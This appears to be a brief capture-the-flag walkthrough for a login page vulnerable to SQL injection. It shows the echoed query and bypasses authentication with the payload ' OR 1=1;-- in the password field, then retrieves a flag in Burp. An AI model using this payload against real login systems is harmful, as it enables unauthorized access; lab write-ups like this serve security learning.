1. try to login with username: 123, password: 123, get below
- 
```
username: 123
password: 123
SQL query: SELECT id FROM users WHERE password = '123' AND username = '123'
```
2. try to exploit the "password" field, username cannot exploit
- username: 123, password: `' OR 1=1;--`
- get flag in Burp
